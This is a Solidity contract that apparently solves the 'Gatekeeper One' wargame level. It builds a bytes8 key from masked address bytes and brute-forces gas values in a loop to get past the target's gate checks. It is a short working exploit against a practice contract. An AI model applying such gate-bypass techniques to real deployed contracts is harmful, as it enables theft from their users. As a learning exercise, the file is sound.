// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";
import "./SafeMath.sol";

contract AttackOnGatekeeper {
    using SafeMath for uint256;
    //0x69F83D29830616D54669E84636079851b547328E
    bytes8 txOrigin16 = 0x36079851b547328E; //last 16 digits of your account
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    GatekeeperOne public gkpOne;

    constructor(address _gatekeeperOne) {
        gkpOne = GatekeeperOne(_gatekeeperOne);
    }

    function Attack() public {
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(gkpOne).call{
                gas: i + 150 + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }
}
